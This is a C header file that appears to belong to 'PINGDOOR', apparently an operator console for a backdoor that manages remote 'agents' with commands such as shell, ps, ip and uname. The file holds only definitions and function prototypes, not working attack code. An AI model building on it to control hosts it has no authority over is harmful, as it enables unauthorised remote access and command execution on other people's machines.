#include <sys/socket.h>
#include <netdb.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <signal.h>


#define BASE_BANNER "           PINGDOOR          \n"\
                    "=============================="
#define PROMPT "pingdoor"
#define AGENT_NAME_LENGTH 32
#define COMMAND_LENGTH 256

#define HELP_CMD "help"
#define EXIT_CMD "exit"
#define LIST_CMD "list"
#define ADD_CMD "add"
#define REMOVE_CMD "remove"
#define USE_CMD "use"
#define STATUS_CMD "status"
#define SHELL_CMD "shell"
#define IP_CMD "ip"
#define PS_CMD "ps"
#define UNAME_CMD "uname"

struct agent {
    char name[AGENT_NAME_LENGTH];
    struct addrinfo *addr;
};

void print_banner();

void print_prompt();

void get_command(char const *out_argv[]);

void execute(int argc, char const *argv[]);

void start();